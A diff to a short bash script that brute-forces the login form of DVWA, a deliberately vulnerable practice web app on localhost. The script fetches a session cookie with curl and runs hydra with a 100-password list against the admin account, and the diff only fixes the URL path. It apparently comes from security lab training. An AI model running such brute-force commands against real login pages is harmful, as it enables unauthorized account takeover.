@@ -1,6 +1,6 @@
 #!/bin/bash
 
-COOKIE=$(curl -k -c - 'https://127.0.0.1/vulnerabilities/brute/index.php')
+COOKIE=$(curl -k -c - 'https://127.0.0.1/DVWA/vulnerabilities/brute/index.php')
 
 hydra localhost -V -l admin -P scripts/100-password-list.txt http-get-form "/home/cyber/DVWA/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=${COOKIE: -26}"
 
